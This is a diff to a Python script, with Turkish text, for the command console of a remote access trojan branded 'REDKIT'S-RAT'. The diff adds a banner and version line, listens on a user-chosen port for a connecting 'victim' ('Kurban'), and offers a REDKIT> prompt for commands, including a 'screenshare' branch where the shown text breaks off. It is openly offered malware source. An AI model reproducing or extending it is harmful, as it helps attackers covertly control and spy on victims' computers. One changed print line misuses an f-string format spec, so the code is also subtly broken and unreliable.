@@ -1,25 +1,37 @@
 import socket
 import sys
 import os
+import pyfiglet
 from colorama import Fore, Back, Style, init
 init()
 
-port=int(input("Dinlemek istediğiniz portu girin: "))
+os.system("clear")
+egik_yazi = pyfiglet.figlet_format("-REDKIT'S-RAT-", font="slant")
+print(Fore.RED + egik_yazi + Fore.RESET)
+
+print(Fore.RED + "    Developer: Redkit" + Fore.RESET)
+print(Fore.RED + "    Version:   1v Free")
+
+
+print(Fore.RED + "--------------------------------------------------------------------------------------------" + Fore.RESET)
+
+print("\n\n\n")
+port=int(input(Fore.BLUE + "Dinlemek istediğiniz portu girin: " + Fore.RESET))
 baglanti=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 baglanti.bind(("0.0.0.0",port))
 print("Sunucu dinleniyor .......")
 baglanti.listen(1)
 conn,addr=baglanti.accept()
-print(f"Kurban bağlandı ({conn,addr})")
+print(f"[+] Target connected. \nTarget: {addr[0]:addr[1]}")
 
 while True:
     emir=input(Fore.RED+"REDKIT> "+Fore.RESET)
-    if emir == "çık":
+    if emir == "exit":
         print("Çıkış yapıldı")
         sys.exit()
         
-    elif emir == "temizle":
-        os.system("cls")
+    elif emir == "clear":
+        os.system("clear")
         continue
     
     elif emir == "screenshare":
